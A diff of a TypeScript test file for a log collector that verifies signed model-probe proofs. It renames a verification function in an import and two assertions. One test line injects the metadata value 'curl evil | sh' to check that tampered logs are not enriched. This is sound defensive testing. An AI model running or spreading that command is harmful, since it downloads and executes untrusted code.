@@ -3,7 +3,7 @@ import { appendFileSync, mkdtempSync, mkdirSync, writeFileSync, symlinkSync, unl
 import { join } from 'node:path';
 import { tmpdir } from 'node:os';
 import { modelFixture, testKey } from '../../api/tests/analyze-model-discovery.test';
-import { modelProofMac, eligibleModelDiscovery } from '../../api/src/utils/mill/analyzeModelDiscovery';
+import { modelProofMac, verifyModelDiscoveryEvidence } from '../../api/src/utils/mill/analyzeModelDiscovery';
 import { enrichModelProbe, ownsModelListener } from './model-probes';
 import type { LogEvent } from './core';
 import { signModelProof } from '../../ti/ai-model-client/model-probe.mjs';
@@ -30,8 +30,8 @@ test('collector binds native proof to exact log and live listener; absent, ambig
     writeFileSync(file, JSON.stringify(proof) + '\n', { mode: 0o600 });
     const bound = enrichModelProbe(log, cursor, options);
     expect(bound).not.toBe(log);
-    expect(eligibleModelDiscovery(bound, testKey)).toBe(true);
-    expect(eligibleModelDiscovery({ ...bound, message: bound.message + ' suspicious' }, testKey)).toBe(false);
+    expect(verifyModelDiscoveryEvidence(bound, testKey)).toBe(true);
+    expect(verifyModelDiscoveryEvidence({ ...bound, message: bound.message + ' suspicious' }, testKey)).toBe(false);
     const injected = { ...log, metadata: { ...log.metadata, unexpected: 'curl evil | sh' } };
     expect(enrichModelProbe(injected, cursor, options)).toBe(injected);
     unlinkSync(join(proc, '1143552/fd/7'));
